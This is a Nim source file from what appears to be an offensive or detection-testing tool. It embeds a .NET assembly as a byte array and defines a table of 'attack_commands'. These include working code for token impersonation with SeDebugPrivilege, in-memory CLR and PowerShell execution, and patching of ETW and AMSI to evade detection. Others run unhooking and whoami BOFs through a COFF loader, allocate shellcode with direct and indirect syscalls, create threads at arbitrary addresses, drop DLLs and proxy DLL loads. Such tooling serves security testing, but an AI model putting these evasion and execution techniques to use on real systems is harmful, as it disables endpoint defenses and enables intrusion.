0x00, 0x6c, 0x00, 0x4e, 0x00, 0x61, 0x00, 0x6d, 0x00, 0x65, 0x00, 0x00, 0x00, 0x68, 0x00, 0x65, 0x00, 0x6c, 0x00, 0x6c, 0x00, 0x6f, 0x00, 0x2e, 0x00, 0x65, 0x00, 0x78, 0x00, 0x65, 0x00, 0x00, 0x00, 0x28, 0x00, 0x02, 0x00, 0x01, 0x00, 0x4c, 0x00, 0x65, 0x00, 0x67, 0x00, 0x61, 0x00, 0x6c, 0x00, 0x43, 0x00, 0x6f, 0x00, 0x70, 0x00, 0x79, 0x00, 0x72, 0x00, 0x69, 0x00, 0x67, 0x00, 0x68, 0x00, 0x74, 0x00, 0x00, 0x00, 0x20, 0x00, 0x00, 0x00, 0x3c, 0x00, 0x0a, 0x00, 0x01, 0x00, 0x4f, 0x00, 0x72, 0x00, 0x69, 0x00, 0x67, 0x00, 0x69, 0x00, 0x6e, 0x00, 0x61, 0x00, 0x6c, 0x00, 0x46, 0x00, 0x69, 0x00, 0x6c, 0x00, 0x65, 0x00, 0x6e, 0x00, 0x61, 0x00, 0x6d, 0x00, 0x65, 0x00, 0x00, 0x00, 0x68, 0x00, 0x65, 0x00, 0x6c, 0x00, 0x6c, 0x00, 0x6f, 0x00, 0x2e, 0x00, 0x65, 0x00, 0x78, 0x00, 0x65, 0x00, 0x00, 0x00, 0x34, 0x00, 0x08, 0x00, 0x01, 0x00, 0x50, 0x00, 0x72, 0x00, 0x6f, 0x00, 0x64, 0x00, 0x75, 0x00, 0x63, 0x00, 0x74, 0x00, 0x56, 0x00, 0x65, 0x00, 0x72, 0x00, 0x73, 0x00, 0x69, 0x00, 0x6f, 0x00, 0x6e, 0x00, 0x00, 0x00, 0x30, 0x00, 0x2e, 0x00, 0x30, 0x00, 0x2e, 0x00, 0x30, 0x00, 0x2e, 0x00, 0x30, 0x00, 0x00, 0x00, 0x38, 0x00, 0x08, 0x00, 0x01, 0x00, 0x41, 0x00, 0x73, 0x00, 0x73, 0x00, 0x65, 0x00, 0x6d, 0x00, 0x62, 0x00, 0x6c, 0x00, 0x79, 0x00, 0x20, 0x00, 0x56, 0x00, 0x65, 0x00, 0x72, 0x00, 0x73, 0x00, 0x69, 0x00, 0x6f, 0x00, 0x6e, 0x00, 0x00, 0x00, 0x30, 0x00, 0x2e, 0x00, 0x30, 0x00, 0x2e, 0x00, 0x30, 0x00, 0x2e, 0x00, 0x30, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0xef, 0xbb, 0xbf, 0x3c, 0x3f, 0x78, 0x6d, 0x6c, 0x20, 0x76, 0x65, 0x72, 0x73, 0x69, 0x6f, 0x6e, 0x3d, 0x22, 0x31, 0x2e, 0x30, 0x22, 0x20, 0x65, 0x6e, 0x63, 0x6f, 0x64, 0x69, 0x6e, 0x67, 0x3d, 0x22, 0x55, 0x54, 0x46, 0x2d, 0x38, 0x22, 0x20, 0x73, 0x74, 0x61, 0x6e, 0x64, 0x61, 0x6c, 0x6f, 0x6e, 0x65, 0x3d, 0x22, 0x79, 0x65, 0x73, 0x22, 0x3f, 0x3e, 0x0d, 0x0a, 0x3c, 0x61, 0x73, 0x73, 0x65, 0x6d, 0x62, 0x6c, 0x79, 0x20, 0x78, 0x6d, 0x6c, 0x6e, 0x73, 0x3d, 0x22, 0x75, 0x72, 0x6e, 0x3a, 0x73, 0x63, 0x68, 0x65, 0x6d, 0x61, 0x73, 0x2d, 0x6d, 0x69, 0x63, 0x72, 0x6f, 0x73, 0x6f, 0x66, 0x74, 0x2d, 0x63, 0x6f, 0x6d, 0x3a, 0x61, 0x73, 0x6d, 0x2e, 0x76, 0x31, 0x22, 0x20, 0x6d, 0x61, 0x6e, 0x69, 0x66, 0x65, 0x73, 0x74, 0x56, 0x65, 0x72, 0x73, 0x69, 0x6f, 0x6e, 0x3d, 0x22, 0x31, 0x2e, 0x30, 0x22, 0x3e, 0x0d, 0x0a, 0x20, 0x20, 0x3c, 0x61, 0x73, 0x73, 0x65, 0x6d, 0x62, 0x6c, 0x79, 0x49, 0x64, 0x65, 0x6e, 0x74, 0x69, 0x74, 0x79, 0x20, 0x76, 0x65, 0x72, 0x73, 0x69, 0x6f, 0x6e, 0x3d, 0x22, 0x31, 0x2e, 0x30, 0x2e, 0x30, 0x2e, 0x30, 0x22, 0x20, 0x6e, 0x61, 0x6d, 0x65, 0x3d, 0x22, 0x4d, 0x79, 0x41, 0x70, 0x70, 0x6c, 0x69, 0x63, 0x61, 0x74, 0x69, 0x6f, 0x6e, 0x2e, 0x61, 0x70, 0x70, 0x22, 0x2f, 0x3e, 0x0d, 0x0a, 0x20, 0x20, 0x3c, 0x74, 0x72, 0x75, 0x73, 0x74, 0x49, 0x6e, 0x66, 0x6f, 0x20, 0x78, 0x6d, 0x6c, 0x6e, 0x73, 0x3d, 0x22, 0x75, 0x72, 0x6e, 0x3a, 0x73, 0x63, 0x68, 0x65, 0x6d, 0x61, 0x73, 0x2d, 0x6d, 0x69, 0x63, 0x72, 0x6f, 0x73, 0x6f, 0x66, 0x74, 0x2d, 0x63, 0x6f, 0x6d, 0x3a, 0x61, 0x73, 0x6d, 0x2e, 0x76, 0x32, 0x22, 0x3e, 0x0d, 0x0a, 0x20, 0x20, 0x20, 0x20, 0x3c, 0x73, 0x65, 0x63, 0x75, 0x72, 0x69, 0x74, 0x79, 0x3e, 0x0d, 0x0a, 0x20, 0x20, 0x20, 0x20, 0x20, 0x20, 0x3c, 0x72, 0x65, 0x71, 0x75, 0x65, 0x73, 0x74, 0x65, 0x64, 0x50, 0x72, 0x69, 0x76, 0x69, 0x6c, 0x65, 0x67, 0x65, 0x73, 0x20, 0x78, 0x6d, 0x6c, 0x6e, 0x73, 0x3d, 0x22, 0x75, 0x72, 0x6e, 0x3a, 0x73, 0x63, 0x68, 0x65, 0x6d, 0x61, 0x73, 0x2d, 0x6d, 0x69, 0x63, 0x72, 0x6f, 0x73, 0x6f, 0x66, 0x74, 0x2d, 0x63, 0x6f, 0x6d, 0x3a, 0x61, 0x73, 0x6d, 0x2e, 0x76, 0x33, 0x22, 0x3e, 0x0d, 0x0a, 0x20, 0x20, 0x20, 0x20, 0x20, 0x20, 0x20, 0x20, 0x3c, 0x72, 0x65, 0x71, 0x75, 0x65, 0x73, 0x74, 0x65, 0x64, 0x45, 0x78, 0x65, 0x63, 0x75, 0x74, 0x69, 0x6f, 0x6e, 0x4c, 0x65, 0x76, 0x65, 0x6c, 0x20, 0x6c, 0x65, 0x76, 0x65, 0x6c, 0x3d, 0x22, 0x61, 0x73, 0x49, 0x6e, 0x76, 0x6f, 0x6b, 0x65, 0x72, 0x22, 0x20, 0x75, 0x69, 0x41, 0x63, 0x63, 0x65, 0x73, 0x73, 0x3d, 0x22, 0x66, 0x61, 0x6c, 0x73, 0x65, 0x22, 0x2f, 0x3e, 0x0d, 0x0a, 0x20, 0x20, 0x20, 0x20, 0x20, 0x20, 0x3c, 0x2f, 0x72, 0x65, 0x71, 0x75, 0x65, 0x73, 0x74, 0x65, 0x64, 0x50, 0x72, 0x69, 0x76, 0x69, 0x6c, 0x65, 0x67, 0x65, 0x73, 0x3e, 0x0d, 0x0a, 0x20, 0x20, 0x20, 0x20, 0x3c, 0x2f, 0x73, 0x65, 0x63, 0x75, 0x72, 0x69, 0x74, 0x79, 0x3e, 0x0d, 0x0a, 0x20, 0x20, 0x3c, 0x2f, 0x74, 0x72, 0x75, 0x73, 0x74, 0x49, 0x6e, 0x66, 0x6f, 0x3e, 0x0d, 0x0a, 0x3c, 0x2f, 0x61, 0x73, 0x73, 0x65, 0x6d, 0x62, 0x6c, 0x79, 0x3e, 0x0d, 0x0a, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x20, 0x00, 0x00, 0x0c, 0x00, 0x00, 0x00, 0xf0, 0x33, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00]

proc loadclr(args: string) {.gcsafe, locks: 0.} =
  var dotnetargs = toCLRVariant([args], VT_BSTR)
  var assembly = load(test_assembly)
  assembly.EntryPoint.Invoke(nil, toCLRVariant([dotnetargs]))

attack_commands["loadclr"] = loadclr
attack_help["loadclr"] = "load a demo C# assembly to the process"


proc SetPrivilege*(hToken: HANDLE): BOOL =
  var tp: TOKEN_PRIVILEGES
  var luid: LUID
  
  LookupPrivilegeValue(NULL, SE_DEBUG_NAME, addr(luid))
  tp.PrivilegeCount = 1
  tp.Privileges[0].Luid = luid
  tp.Privileges[0].Attributes = SE_PRIVILEGE_ENABLED

  AdjustTokenPrivileges(hToken, cast[WINBOOL](FALSE), addr(tp), cast[DWORD](sizeof((TOKEN_PRIVILEGES))), cast[PTOKEN_PRIVILEGES](NULL), cast[PDWORD](NULL))
  if GetLastError() == ERROR_NOT_ALL_ASSIGNED:
    echo(" ! the token does not have the specified privilege \n")
    return FALSE
  return TRUE

proc lpwstrc(bytes: openarray[TCHAR]): string =
  result = newString(bytes.len)
  copyMem(result[0].addr, bytes[0].unsafeAddr, bytes.len)

proc get_username*(): string =
  var username: array[UNLEN + 1, TCHAR]
  var username_len: DWORD = UNLEN + 1
  GetUserName(addr username[0], addr(username_len))

  return lpwstrc(username)

proc impersonate*(args: string) =
  echo " ! current user is: ", get_username()

  var PID_TO_IMPERSONATE: DWORD = cast[DWORD](parseInt(args))

  var tokenHandle: HANDLE
  var duplicateTokenHandle: HANDLE
  var startupInfo: STARTUPINFO
  var processInformation: PROCESS_INFORMATION
  ZeroMemory(addr(startupInfo), sizeof((STARTUPINFO)))
  ZeroMemory(addr(processInformation), sizeof((PROCESS_INFORMATION)))
  startupInfo.cb = cast[DWORD](sizeof((STARTUPINFO)))
  
  var currentTokenHandle: HANDLE

  var getCurrentToken: BOOL = OpenProcessToken(GetCurrentProcess(),
      TOKEN_ADJUST_PRIVILEGES, addr(currentTokenHandle))

  echo " ! OpenProcessToken GLE:", GetLastError()
  discard SetPrivilege(currentTokenHandle)
  echo " ! SeDebugPrivilege enabled"

  echo " ! SetPrivilege GLE:", GetLastError()
  var processHandle: HANDLE = OpenProcess(PROCESS_QUERY_INFORMATION, TRUE, PID_TO_IMPERSONATE)

  echo " ! OpenProcess GLE:", GetLastError()
  var getToken: BOOL = OpenProcessToken(processHandle, TOKEN_DUPLICATE or
      TOKEN_ASSIGN_PRIMARY or TOKEN_QUERY, addr(tokenHandle))
  echo " ! OpenProcessToken GLE:", GetLastError()
  
  var impersonateUser: BOOL = ImpersonateLoggedOnUser(tokenHandle)
  echo " ! ImpersonateLoggedOnUser GLE:", GetLastError()


attack_commands["impersonate"] = impersonate
attack_help["impersonate"] = "calls ImpersonateLoggedOnUser on pid\n\t\t\targs = pid"


import osproc
proc spawn(args: string) {.gcsafe, locks: 0.} =
  echo " ! starting"
  var mprocess = startProcess(args)
  echo " ! pid ", mprocess.processID

attack_commands["spawn"] = spawn
attack_help["spawn"] = "calls startprocess\n\t\t\targs = cmdline"

proc exec(args: string) {.gcsafe, locks: 0.} =
  echo " ! starting"
  var mprocess = execCmd(args)
  echo " ! done execution "

attack_commands["exec"] = exec
attack_help["exec"] = "calls execCmd\n\targs = cmdline"

import std/httpclient
proc iwr(args: string) {.gcsafe, locks: 0.} =
  var client = newHttpClient()
  echo " ! querying ", args
  echo client.getContent(args)[0 .. 200]

attack_commands["iwr"] = iwr
attack_help["iwr"] = "fetches a URL (http only), prints first 200 chars\n\t\t\targs = url"



# stolen from offensive Nim
proc patchetw_cmd(args: string) =
    const patch: array[1, byte] = [byte 0xc3]
    var
        ntdll: LibHandle
        cs: pointer
        op: DWORD
        t: DWORD

    ntdll = loadLib("ntdll")
    cs = ntdll.symAddr("EtwEventWrite") # equivalent of GetProcAddress()

    if VirtualProtect(cs, patch.len, 0x40, addr op):
        copyMem(cs, unsafeAddr patch, patch.len)
        VirtualProtect(cs, patch.len, op, addr t)
attack_commands["patchetw"] = patchetw_cmd
attack_help["patchetw"] = "patch EtwEventWrite with a single RET (evasion)"



proc patchamsi_cmd(args: string) =
    const patch: array[6, byte] = [byte 0xB8, 0x57, 0x00, 0x07, 0x80, 0xC3]
    var
        amsi: LibHandle
        cs: pointer
        op: DWORD
        t: DWORD


    amsi = loadLib("amsi")

    cs = amsi.symAddr("AmsiScanBuffer") # equivalent of GetProcAddress()

    if VirtualProtect(cs, patch.len, 0x40, addr op):
        copyMem(cs, unsafeAddr patch, patch.len)
        VirtualProtect(cs, patch.len, op, addr t)

attack_commands["patchamsi"] = patchamsi_cmd
attack_help["patchamsi"] = "patch AMSI (evasion)"



import memlib, ptr_math

proc bof_callback(data: cstring, status: int): int {.gcsafe, stdcall.} = 
  echo " ! BOF output:"
  echo data
  return


proc whoami_bof(args: string) {.gcsafe, locks: 0.} = 
  const coffloader = staticReadDll("resources/COFFLoader.x64.dll")
  proc loadcoff (data: LPVOID, length: int, callback: proc (data: cstring, status: int) : int {.stdcall, gcsafe.}) : int {.cdecl, memlib: coffloader, importc: "LoadAndRun".}

  var entrypoint_arg: array[11, byte] = [byte 0xff, 0xff, 0xff, 0xff, 0x03, 0x00, 0x00, 0x00, 0x67, 0x6f, 0x00] # len(c"go"), c"go"

  var coff_arg: array[4, byte] = [byte 0x00, 0x00, 0x00, 0x00]



  const stcoff_file = staticRead("../resources/whoami.o")

  var coff_file: string = stcoff_file



  var loader_args = VirtualAlloc(nil, 4 + len(coff_file) + len(entrypoint_arg) + len(coff_arg), MEM_COMMIT, PAGE_READWRITE)

  echo " ! VirtualAlloc ", GetLastError(), " to ", toHex(cast[int](loader_args))
  # "go" entrypoint
  copyMem(loader_args, addr entrypoint_arg, len(entrypoint_arg))

  # file size
  var coffsize = len(coff_file)
  copyMem(loader_args + len(entrypoint_arg), &coff_size, 4)

  # file bytes
  copyMem(loader_args + len(entrypoint_arg) + 4, &coff_file[0], len(coff_file))

  # args
  copyMem(loader_args + len(entrypoint_arg) + len(coff_file) + 4, addr coff_arg, len(coff_arg))

  echo " ! memory copied"

  discard loadcoff(loader_args, len(coff_file)+len(entrypoint_arg)+len(coff_arg)+4, bof_callback)

attack_commands["whoami_bof"] = whoami_bof
attack_help["whoami_bof"] = "calls whoami.o BOF (for testing COFFLoading)"


proc unhook_bof(args: string) {.gcsafe, locks: 0.} = 
  const coffloader = staticReadDll("resources/COFFLoader.x64.dll")
  proc loadcoff (data: LPVOID, length: int, callback: proc (data: cstring, status: int) : int {.stdcall, gcsafe.}) : int {.cdecl, memlib: coffloader, importc: "LoadAndRun".}

  var entrypoint_arg: array[11, byte] = [byte 0xff, 0xff, 0xff, 0xff, 0x03, 0x00, 0x00, 0x00, 0x67, 0x6f, 0x00] # len(c"go"), c"go"

  var coff_arg: array[15, byte] = [byte 0x0b, 0x00, 0x00, 0x00, 0x75, 0x73, 0x65, 0x72, 0x33, 0x32, 0x2e, 0x64, 0x6c, 0x6c, 0x00]



  const stcoff_file = staticRead("../resources/unhook.o")

  var coff_file: string = stcoff_file



  var loader_args = VirtualAlloc(nil, 4 + len(coff_file) + len(entrypoint_arg) + len(coff_arg), MEM_COMMIT, PAGE_READWRITE)

  echo " ! VirtualAlloc ", GetLastError(), " to ", toHex(cast[int](loader_args))
  # "go" entrypoint
  copyMem(loader_args, addr entrypoint_arg, len(entrypoint_arg))

  # file size
  var coffsize = len(coff_file)
  copyMem(loader_args + len(entrypoint_arg), &coff_size, 4)

  # file bytes
  copyMem(loader_args + len(entrypoint_arg) + 4, &coff_file[0], len(coff_file))

  # args
  copyMem(loader_args + len(entrypoint_arg) + len(coff_file) + 4, addr coff_arg, len(coff_arg))

  echo " ! memory copied"

  discard loadcoff(loader_args, len(coff_file)+len(entrypoint_arg)+len(coff_arg)+4, bof_callback)

attack_commands["unhook_bof"] = unhook_bof
attack_help["unhook_bof"] = "calls unhook.o BOF (as another unhooking method)"

proc dropdll(args: string) {.gcsafe, locks: 0.} = 
  const dll_content = slurp("../resources/stub.dll")
  writeFile(args, dll_content)
attack_commands["dropdll"] = dropdll
attack_help["dropdll"] = "drop a stub dll to disk\n\t\t\targs = dll path, export = Run"


import sugar
proc loadpsh(args: string) {.gcsafe, locks: 0.} = 
  var Automation = load("System.Management.Automation")
  var RunspaceFactory = Automation.GetType("System.Management.Automation.Runspaces.RunspaceFactory")

  var runspace = @RunspaceFactory.CreateRunspace()

  runspace.Open()

  var pipeline = runspace.CreatePipeline()
  pipeline.Commands.AddScript(args)
  pipeline.Commands.Add("Out-String")

  var results = pipeline.Invoke()
  try:
    for i in countUp(0, cast[int](results.Count())-1):
      echo results.Item(i)
  except CLRError:
    echo " ! results end"
  finally: # yeah, sue me
    runspace.Close()

attack_commands["loadpsh"] = loadpsh
attack_help["loadpsh"] = "execute psh with System.Management.Automation\n\t\t\targs = psh script"

include syscalls

proc directrx(args: string) =
    var scaddr = VirtualAlloc(nil, cast[SIZE_T](shellcode.len), MEM_COMMIT, PAGE_READWRITE);
  
    CopyMemory(scaddr, &shellcode[0], shellcode.len);
    var scsize: SIZE_T = cast[SIZE_T](shellcode.len)
    var op: ULONG
    var status = directprotectvm(GetCurrentProcess(), addr scaddr, &scsize, PAGE_EXECUTE_READ, addr op)
    
    echo "allocated RX (WS>0) with messagebox @", toHex(cast[int](scaddr))
    echo "status = ", toHex(status)
attack_commands["directrx"] = directrx
attack_help["directrx"] = "allocate a messagebox shellcode and protect it as RX with direct syscalls"

proc indirectrx(args: string) =
    var scaddr = VirtualAlloc(nil, cast[SIZE_T](shellcode.len), MEM_COMMIT, PAGE_READWRITE);
  
    CopyMemory(scaddr, &shellcode[0], shellcode.len);
    var scsize: SIZE_T = cast[SIZE_T](shellcode.len)
    var op: ULONG
    var status = indirectprotectvm(GetCurrentProcess(), addr scaddr, &scsize, PAGE_EXECUTE_READ, addr op)
    
    echo "allocated RX (WS>0) with messagebox @", toHex(cast[int](scaddr))
    echo "status = ", toHex(status)
attack_commands["indirectrx"] = indirectrx
attack_help["indirectrx"] = "allocate a messagebox shellcode and protect it as RX with indirect syscalls"


proc createthread(args: string) =
    CreateThread(NULL, 0, cast[LPTHREAD_START_ROUTINE](fromHex[uint64](args)), NULL, 0, NULL)
attack_commands["createthread"] = createthread
attack_help["createthread"] = "creates a thread @ a hex address"

proc directthread(args: string) {.gcsafe, locks: 0.} =
    var tHandle: HANDLE
    var status = directthreadex(addr tHandle, 0x1FFFFF, NULL, GetCurrentProcess(), cast[LPTHREAD_START_ROUTINE](fromHex[uint64](args)), NULL, FALSE, NULL, NULL, NULL, NULL)
    echo "NtCreateThreadEx called (direct) with status ", toHex(cast[int](status))

attack_commands["directthread"] = directthread
attack_help["directthread"] = "creates a thread @ a hex address with direct syscalls"

proc indirectthread(args: string) {.gcsafe, locks: 0.} =
    var tHandle: HANDLE
    var status = indirectthreadex(addr tHandle, 0x1FFFFF, NULL, GetCurrentProcess(), cast[LPTHREAD_START_ROUTINE](fromHex[uint64](args)), NULL, FALSE, NULL, NULL, NULL, NULL)
    echo "NtCreateThreadEx called (indirect) with status ", toHex(cast[int](status))

attack_commands["indirectthread"] = indirectthread
attack_help["indirectthread"] = "creates a thread @ a hex address with indirect syscalls"

proc RtlQueueWorkItem(
  function: PVOID,
  context: PVOID,
  flags: ULONG
): NTSTATUS {.importc: "RtlQueueWorkItem", dynlib: "ntdll", stdcall.}


proc proxyload(args: string) =
    var hkernel32: HANDLE = LoadLibraryA("kernel32.dll")
    var loadlibaddr = cast[PVOID](GetProcAddress(hkernel32, "LoadLibraryA"))
    discard RtlQueueWorkItem(loadlibaddr, (PVOID)(unsafeAddr args[0]), 0x00000000)
attack_commands["proxyload"] = proxyload
attack_help["proxyload"] = "proxy a DLL load with RtlQueueWorkItem"
